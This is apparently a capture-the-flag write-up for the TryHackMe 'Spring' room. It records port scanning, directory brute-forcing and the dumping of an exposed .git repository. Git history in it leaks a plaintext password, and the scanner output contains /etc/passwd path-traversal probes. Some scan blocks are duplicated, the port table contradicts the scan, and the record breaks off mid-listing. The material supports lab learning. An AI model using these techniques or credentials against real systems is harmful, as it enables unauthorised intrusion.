<h1 align="center"><a href="https://tryhackme.com/room/spring">Spring</a></h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/158a4006-92e7-430d-a05f-1592c1cb84e3"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2015-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>


<br>
<h2>Task 1 . Introduction</h2>
<p>This machine may take up to 5 minutes to fully deploy.<br>

John created a simple Hello World Web Application, he is still learning.<br>

See if you can find a way to hack him.</p>

<p><em>Answer the questions below</em></p>

<br>
<h1 align="center">Port Scanning<a id='1'></a></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                       |
|-------------------:|:---------------------|:----------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`SMTP`                |Postfix smtpd                      |
| `443`              |`SSL/HTTP`            |nginx 1.29.3                       |


</p></div><br>


```bash
:~/Spring# nmap -sC -sV -Pn -n -p- -T4 xx.xx.xxx.xxxx
...
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp  open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 ...
|     Location: https://localhost/
|     Content-Length: 0
|     Date: Thu, 15 Jan 2026 ...
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 15 Jan 2026...
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://xx.xx.xxx.xxx/
443/tcp open  ssl/https
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_ssl-date: 2026-01-15T...; 0s from scanner time.
```

<h1 align="center">File Enumeration<a id='2'></a></h1>
<p align="left">
  
- /sources/<br>
- /logout/<br><br>
- /sources/new/.git/index/br>
- /sources/new/.git/config/<br>
- /sources/new/.git/HEAD/br><br>
- /sources/new/.git/logs/HEAD</p>


<p>Used <code>ffuf</code>code> with the following parameters:<br>

- <code>-u</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Target URL<br>
- <code>-w</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'<br>
- <code>-mc</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp;  Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)<br>
- <code>-ic</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Ignore wordlist comments (default: false)<br>
- <code>-c</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Colorize output. (default: false)<br>
- <code>-e</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Comma separated list of extensions. Extends FUZZ keyword.<br>
- <code>-t</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : &nbsp; Number of concurrent threads. (default: 40)</p>

```bash
:~/Spring# ffuf -u https://xx.xx.xxx.xxx:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -ic -c -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://xx.xx.xxx.xxx:443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200,301,302
________________________________________________

                        [Status: 200, Size: 13, Words: 2, Lines: 1]
sources                 [Status: 302, Size: 0, Words: 1, Lines: 1]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```


```bash
:~/Spring$ dirsearch -u https://spring.thm/sources/new -t 200 -r -R 5
...

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

...

Target: https://spring.thm/

[20:24:32] Starting: sources/new/
[20:24:41] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
[20:24:41] 200 -  148B  - /sources/new/.git/config
[20:24:41] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
[20:24:41] 200 -   73B  - /sources/new/.git/description
[20:24:41] 200 -    1KB - /sources/new/.git/index
[20:24:41] 200 -  240B  - /sources/new/.git/info/exclude
[20:24:42] 200 -  319B  - /sources/new/.git/logs/HEAD
[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/
[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/
[20:24:42] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
[20:24:42] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/
Added to the queue: sources/new/.git/refs/heads/
[20:24:42] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/
Added to the queue: sources/new/.git/refs/tags/
[20:24:42] 200 -  355B  - /sources/new/.gitignore
Added to the queue: sources/new/.git/
[20:24:41] 200 -   23B  - /sources/new/.git/HEAD
Added to the queue: sources/new/.git/logs/refs/
[20:24:42] 200 -   41B  - /sources/new/.git/refs/heads/master
Added to the queue: sources/new/.git/logs/refs/heads/
[20:24:52] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:24:54] 400 -  435B  - /sources/new/a%5c.aspx

[20:26:04] Starting: sources/new/.git/refs/heads/
[20:26:16] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:26:17] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx

[20:27:28] Starting: sources/new/.git/refs/tags/
[20:27:36] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:27:37] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx

[20:28:42] Starting: sources/new/.git/
[20:28:54] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:28:55] 400 -  435B  - /sources/new/.git/a%5c.aspx
[20:29:12] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:29:26] 302 -    0B  - /sources/new/.git/info  ->  /sources/new/.git/info/
Added to the queue: sources/new/.git/info/
[20:29:30] 302 -    0B  - /sources/new/.git/logs  ->  /sources/new/.git/logs/
Added to the queue: sources/new/.git/logs/
[20:29:34] 302 -    0B  - /sources/new/.git/objects  ->  /sources/new/.git/objects/
Added to the queue: sources/new/.git/objects/

[20:30:02] Starting: sources/new/.git/logs/refs/
[20:30:11] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:30:12] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx

[20:31:17] Starting: sources/new/.git/logs/refs/heads/
[20:31:26] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:31:27] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
[################    ] 84%   9723/11460       109/s       job:6/9  errors:0

[20:32:43] Starting: sources/new/.git/info/
[20:32:45] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:32:53] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:32:53] 400 -  435B  - /sources/new/.git/info/a%5c.aspx

[20:33:56] Starting: sources/new/.git/logs/
[20:33:58] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:34:06] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:34:07] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx

[20:35:08] Starting: sources/new/.git/objects/
[20:35:10] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:35:17] 302 -    0B  - /sources/new/.git/objects/06  ->  /sources/new/.git/objects/06/
Added to the queue: sources/new/.git/objects/06/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/29  ->  /sources/new/.git/objects/29/
Added to the queue: sources/new/.git/objects/29/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/39  ->  /sources/new/.git/objects/39/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/66  ->  /sources/new/.git/objects/66/
Added to the queue: sources/new/.git/objects/66/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/69  ->  /sources/new/.git/objects/69/
Added to the queue: sources/new/.git/objects/69/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/71  ->  /sources/new/.git/objects/71/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/80  ->  /sources/new/.git/objects/80/
Added to the queue: sources/new/.git/objects/39/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/93  ->  /sources/new/.git/objects/93/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/92  ->  /sources/new/.git/objects/92/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/98  ->  /sources/new/.git/objects/98/
[20:35:18] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:35:18] 302 -    0B  - /sources/new/.git/objects/67  ->  /sources/new/.git/objects/67/
Added to the queue: sources/new/.git/objects/71/
Added to the queue: sources/new/.git/objects/80/
Added to the queue: sources/new/.git/objects/93/
Added to the queue: sources/new/.git/objects/92/
Added to the queue: sources/new/.git/objects/98/
Added to the queue: sources/new/.git/objects/67/
[20:35:19] 400 -  435B  - /sources/new/.git/objects/a%5c.aspx
[20:35:34] 302 -    0B  - /sources/new/.git/objects/cc  ->  /sources/new/.git/objects/cc/
Added to the queue: sources/new/.git/objects/cc/
[20:35:46] 302 -    0B  - /sources/new/.git/objects/info  ->  /sources/new/.git/objects/info/
Added to the queue: sources/new/.git/objects/info/

[20:36:22] Starting: sources/new/.git/objects/06/
[20:36:35] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:36:36] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx

[20:37:50] Starting: sources/new/.git/objects/29/
[20:37:59] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:38:00] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx
[########            ] 43%   4980/11460       176/s       job:11/22 errors:0
```



```bash
:~/Spring# ffuf -u https://xx.xx.xxx.xxx:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -ic -c -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://xx.xx.xxx.xxx:443/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200,301,302
________________________________________________

                        [Status: 200, Size: 13, Words: 2, Lines: 1]
sources                 [Status: 302, Size: 0, Words: 1, Lines: 1]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

```bash
$ python3 -m venv venv
```

```bash
$ source venv/bin/activate
```

```bash
(venv) c:~/Spring$ pip3 install git-dumper
```

```bash
(venv) c:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /home/cyberlaser/Spring/data
```

```bash
(venv) c:~/Spring$ git-dumper https://spring.thm/sources/new/.git/ /home/cyberlaser/Spring/data
```

```bash
:~/Spring$ dirsearch -u https://spring.thm/sources/new -t 200 -r -R 5
...

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 11460

...
Target: https://spring.thm/

[xx:xx:xx] Starting: sources/new/
[20:24:41] 302 -    0B  - /sources/new/.git  ->  /sources/new/.git/
[20:24:41] 200 -  148B  - /sources/new/.git/config
[20:24:41] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
[20:24:41] 200 -   73B  - /sources/new/.git/description
[20:24:41] 200 -    1KB - /sources/new/.git/index
[20:24:41] 200 -  240B  - /sources/new/.git/info/exclude
[20:24:42] 200 -  319B  - /sources/new/.git/logs/HEAD
[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/
[20:24:42] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/
[20:24:42] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
[20:24:42] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/
Added to the queue: sources/new/.git/refs/heads/
[20:24:42] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/
Added to the queue: sources/new/.git/refs/tags/
[20:24:42] 200 -  355B  - /sources/new/.gitignore
Added to the queue: sources/new/.git/
[20:24:41] 200 -   23B  - /sources/new/.git/HEAD
Added to the queue: sources/new/.git/logs/refs/
[20:24:42] 200 -   41B  - /sources/new/.git/refs/heads/master
Added to the queue: sources/new/.git/logs/refs/heads/
[20:24:52] 400 -  435B  - /sources/new/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:24:54] 400 -  435B  - /sources/new/a%5c.aspx

[20:26:04] Starting: sources/new/.git/refs/heads/
[20:26:16] 400 -  435B  - /sources/new/.git/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:26:17] 400 -  435B  - /sources/new/.git/refs/heads/a%5c.aspx

[20:27:28] Starting: sources/new/.git/refs/tags/
[20:27:36] 400 -  435B  - /sources/new/.git/refs/tags/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:27:37] 400 -  435B  - /sources/new/.git/refs/tags/a%5c.aspx

[20:28:42] Starting: sources/new/.git/
[20:28:54] 400 -  435B  - /sources/new/.git/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:28:55] 400 -  435B  - /sources/new/.git/a%5c.aspx
[20:29:12] 500 -  455B  - /sources/new/.git/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:29:26] 302 -    0B  - /sources/new/.git/info  ->  /sources/new/.git/info/
Added to the queue: sources/new/.git/info/
[20:29:30] 302 -    0B  - /sources/new/.git/logs  ->  /sources/new/.git/logs/
Added to the queue: sources/new/.git/logs/
[20:29:34] 302 -    0B  - /sources/new/.git/objects  ->  /sources/new/.git/objects/
Added to the queue: sources/new/.git/objects/

[20:30:02] Starting: sources/new/.git/logs/refs/
[20:30:11] 400 -  435B  - /sources/new/.git/logs/refs/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:30:12] 400 -  435B  - /sources/new/.git/logs/refs/a%5c.aspx

[20:31:17] Starting: sources/new/.git/logs/refs/heads/
[20:31:26] 400 -  435B  - /sources/new/.git/logs/refs/heads/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:31:27] 400 -  435B  - /sources/new/.git/logs/refs/heads/a%5c.aspx
[################    ] 84%   9723/11460       109/s       job:6/9  errors:0

[20:32:43] Starting: sources/new/.git/info/
[20:32:45] 500 -  455B  - /sources/new/.git/info/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:32:53] 400 -  435B  - /sources/new/.git/info/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:32:53] 400 -  435B  - /sources/new/.git/info/a%5c.aspx

[20:33:56] Starting: sources/new/.git/logs/
[20:33:58] 500 -  455B  - /sources/new/.git/logs/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:34:06] 400 -  435B  - /sources/new/.git/logs/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:34:07] 400 -  435B  - /sources/new/.git/logs/a%5c.aspx

[20:35:08] Starting: sources/new/.git/objects/
[20:35:10] 500 -  455B  - /sources/new/.git/objects/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[20:35:17] 302 -    0B  - /sources/new/.git/objects/06  ->  /sources/new/.git/objects/06/
Added to the queue: sources/new/.git/objects/06/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/29  ->  /sources/new/.git/objects/29/
Added to the queue: sources/new/.git/objects/29/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/39  ->  /sources/new/.git/objects/39/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/66  ->  /sources/new/.git/objects/66/
Added to the queue: sources/new/.git/objects/66/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/69  ->  /sources/new/.git/objects/69/
Added to the queue: sources/new/.git/objects/69/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/71  ->  /sources/new/.git/objects/71/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/80  ->  /sources/new/.git/objects/80/
Added to the queue: sources/new/.git/objects/39/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/93  ->  /sources/new/.git/objects/93/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/92  ->  /sources/new/.git/objects/92/
[20:35:18] 302 -    0B  - /sources/new/.git/objects/98  ->  /sources/new/.git/objects/98/
[20:35:18] 400 -  435B  - /sources/new/.git/objects/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:35:18] 302 -    0B  - /sources/new/.git/objects/67  ->  /sources/new/.git/objects/67/
Added to the queue: sources/new/.git/objects/71/
Added to the queue: sources/new/.git/objects/80/
Added to the queue: sources/new/.git/objects/93/
Added to the queue: sources/new/.git/objects/92/
Added to the queue: sources/new/.git/objects/98/
Added to the queue: sources/new/.git/objects/67/
[20:35:19] 400 -  435B  - /sources/new/.git/objects/a%5c.aspx
[20:35:34] 302 -    0B  - /sources/new/.git/objects/cc  ->  /sources/new/.git/objects/cc/
Added to the queue: sources/new/.git/objects/cc/
[20:35:46] 302 -    0B  - /sources/new/.git/objects/info  ->  /sources/new/.git/objects/info/
Added to the queue: sources/new/.git/objects/info/

[20:36:22] Starting: sources/new/.git/objects/06/
[20:36:35] 400 -  435B  - /sources/new/.git/objects/06/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:36:36] 400 -  435B  - /sources/new/.git/objects/06/a%5c.aspx

[20:37:50] Starting: sources/new/.git/objects/29/
[20:37:59] 400 -  435B  - /sources/new/.git/objects/29/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:38:00] 400 -  435B  - /sources/new/.git/objects/29/a%5c.aspx

[20:39:16] Starting: sources/new/.git/objects/66/
[20:39:27] 400 -  435B  - /sources/new/.git/objects/66/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:39:28] 400 -  435B  - /sources/new/.git/objects/66/a%5c.aspx

[20:40:45] Starting: sources/new/.git/objects/69/
[20:40:54] 400 -  435B  - /sources/new/.git/objects/69/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:40:55] 400 -  435B  - /sources/new/.git/objects/69/a%5c.aspx

[20:42:11] Starting: sources/new/.git/objects/39/
[20:42:21] 400 -  435B  - /sources/new/.git/objects/39/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:42:22] 400 -  435B  - /sources/new/.git/objects/39/a%5c.aspx

[20:43:39] Starting: sources/new/.git/objects/93/
[20:43:50] 400 -  435B  - /sources/new/.git/objects/93/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:43:51] 400 -  435B  - /sources/new/.git/objects/93/a%5c.aspx

[20:45:09] Starting: sources/new/.git/objects/67/
[20:45:19] 400 -  435B  - /sources/new/.git/objects/67/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:45:20] 400 -  435B  - /sources/new/.git/objects/67/a%5c.aspx

[20:46:40] Starting: sources/new/.git/objects/71/
[20:46:51] 400 -  435B  - /sources/new/.git/objects/71/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:46:52] 400 -  435B  - /sources/new/.git/objects/71/a%5c.aspx

[20:48:28] Starting: sources/new/.git/objects/80/
[20:48:37] 400 -  435B  - /sources/new/.git/objects/80/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:48:38] 400 -  435B  - /sources/new/.git/objects/80/a%5c.aspx

[20:49:40] Starting: sources/new/.git/objects/92/
[20:49:49] 400 -  435B  - /sources/new/.git/objects/92/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:49:50] 400 -  435B  - /sources/new/.git/objects/92/a%5c.aspx

[20:50:54] Starting: sources/new/.git/objects/98/
[20:51:03] 400 -  435B  - /sources/new/.git/objects/98/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:51:04] 400 -  435B  - /sources/new/.git/objects/98/a%5c.aspx

[20:52:25] Starting: sources/new/.git/objects/cc/
[20:52:35] 400 -  435B  - /sources/new/.git/objects/cc/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:52:36] 400 -  435B  - /sources/new/.git/objects/cc/a%5c.aspx

[20:53:42] Starting: sources/new/.git/objects/info/
[20:53:53] 400 -  435B  - /sources/new/.git/objects/info/\..\..\..\..\..\..\..\..\..\etc\passwd
[20:53:54] 400 -  435B  - /sources/new/.git/objects/info/a%5c.aspx

Task Completed
```

```bash
:~/Spring/data$ ls -lah
total 48K
drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 20:42 .
drwxr-xr-x 5 cyberlaser cyberlaser 4.0K Jan 15 20:30 ..
drwxr-xr-x 7 cyberlaser cyberlaser 4.0K Jan 15 20:42 .git
-rw-r--r-- 1 cyberlaser cyberlaser  355 Jan 15 20:42 .gitignore
-rw-r--r-- 1 cyberlaser cyberlaser 1.2K Jan 15 20:42 build.gradle
drwxr-xr-x 3 cyberlaser cyberlaser 4.0K Jan 15 20:42 gradle
-rw-r--r-- 1 cyberlaser cyberlaser 5.4K Jan 15 20:42 gradlew
-rw-r--r-- 1 cyberlaser cyberlaser 3.0K Jan 15 20:42 gradlew.bat
-rw-r--r-- 1 cyberlaser cyberlaser   28 Jan 15 20:42 settings.gradle
-rw-r--r-- 1 cyberlaser cyberlaser   45 Jan 15 20:16 shell.sh
drwxr-xr-x 4 cyberlaser cyberlaser 4.0K Jan 15 20:42 src
```

<br>
<br>
<br>


```bash
:~/Spring/sources/new/.git/.git$ ls -lah
total 48K
drwxr-xr-x  7 cyberlaser cyberlaser 4.0K Jan 15 20:49 .
drwxr-xr-x  5 cyberlaser cyberlaser 4.0K Jan 15 20:49 ..
-rw-r--r--  1 cyberlaser cyberlaser  401 Jan 15 20:49 COMMIT_EDITMSG
-rw-r--r--  1 cyberlaser cyberlaser   23 Jan 15 20:49 HEAD
-rw-r--r--  1 cyberlaser cyberlaser  148 Jan 15 20:49 config
-rw-r--r--  1 cyberlaser cyberlaser   73 Jan 15 20:49 description
drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 20:49 hooks
-rw-r--r--  1 cyberlaser cyberlaser 1.5K Jan 15 20:49 index
drwxr-xr-x  2 cyberlaser cyberlaser 4.0K Jan 15 20:49 info
drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 20:49 logs
drwxr-xr-x 40 cyberlaser cyberlaser 4.0K Jan 15 20:49 objects
drwxr-xr-x  3 cyberlaser cyberlaser 4.0K Jan 15 20:49 refs
```

```bash
(venv) ...:~/Spring/sources/new/.git/.git$ git log
commit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)
Author: John Smith <johnsmith@spring.thm>
Date:   Fri Jul 10 18:13:55 2020 +0000

    added greeting
    changed security password to my usual format

commit 92b433a86a015517f746a3437ba3802be9146722
Author: John Smith <johnsmith@spring.thm>
Date:   Sat Jul 4 23:53:25 2020 +0000

    Hello world
```

<br>
<p>
  
- spring.security.user.name=johnsmith<br>
- spring.security.user.password=idontwannag0<br>
+ spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>

```bash
(venv) ...:~/Spring/sources/new/.git/.git$ git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
diff --git a/src/main/java/com/onurshin/spring/Application.java b/src/main/java/com/onurshin/spring/Application.java
index fee60ff..e49a401 100644
--- a/src/main/java/com/onurshin/spring/Application.java
+++ b/src/main/java/com/onurshin/spring/Application.java
@@ -18,6 +18,7 @@ import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;

 @SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
@@ -28,10 +29,12 @@ public class Application {
     }

     @RestController
+    //https://spring.io/guides/gs/rest-service/
     static class HelloWorldController {
         @RequestMapping("/")
-        public String hello() {
-            return "Hello WORLD";
+        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
+            System.out.println(name);
+            return String.format("Hello, %s!", name);
         }
     }

@@ -57,8 +60,6 @@ public class Application {
                 securityConstraint.addCollection(collection);
                 context.addConstraint(securityConstraint);
                 context.setUseHttpOnly(true);
-
-                System.out.println(context.findChild("default"));
             }

             @Override
diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
index ccf5992..71e1811 100644
--- a/src/main/resources/application.properties
+++ b/src/main/resources/application.properties
@@ -12,7 +12,7 @@ spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.
 server.servlet.register-default-servlet=true
 spring.mvc.ignore-default-model-on-redirect=true
 spring.security.user.name=johnsmith
-spring.security.user.password=idontwannag0
+spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦
 debug=false
 spring.cloud.config.uri=
 spring.cloud.config.allow-override=true
```

```bash
(venv) ...:~/Spring/sources/new/.git$ git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
HEAD is now at 1a83ec3 added greeting changed security password to my usual format
```

```bash
(venv) ...:~/Spring/sources/new/.git$ find -ls | grep -v \\.git
   217813      4 drwxr-xr-x   5 cyberlaser cyberlaser     4096 Jan 15 20:49 .
